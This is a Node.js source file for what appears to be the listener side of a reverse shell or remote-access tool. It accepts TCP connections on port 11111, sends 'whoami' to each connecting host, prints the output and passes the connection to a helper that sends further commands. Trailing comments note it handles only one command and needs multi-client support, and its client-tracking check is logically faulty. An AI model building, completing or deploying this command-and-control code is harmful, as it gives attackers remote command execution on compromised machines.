"use strict";
const net = require("net");
const util = require("../utils.js");
const port = 11111;
const socketClients = require("./clients.js");
const server = net.createServer((client) => {
    client.on("error", (error) => {
        switch (error.code) {
            case "ECONNRESET":
                console.log("\[-] Client disconnected!");
                util.getClientCount(server);
                break;
            default:
                break;
        }
    });
});

server.listen({
   host : "0.0.0.0",
   port,
},() => {
    console.log(`Socket server listening at ${server.address().address}:${port}`);
});

server.on("connection", async (client) => {
    console.log(`[+] Connection receieved: ${client.remoteAddress}:${client.address().port}`);
    if (socketClients.indexOf(client)) {
        socketClients.pop();
    }
    socketClients.push(client);

    util.getClientCount(server);
    client.write("whoami");

    client.on("data", (data) =>  {
        console.log(data.toString());
        util.takeAndSendCommand(socketClients[0]);
    });
});

module.exports = server;

// WE NEED TO ALLOW FOR MULTIPLE CONNECTIONS
// THIS IS A POTENTIL FIX FOR THE 1 COMMAND ONLY PROBLEM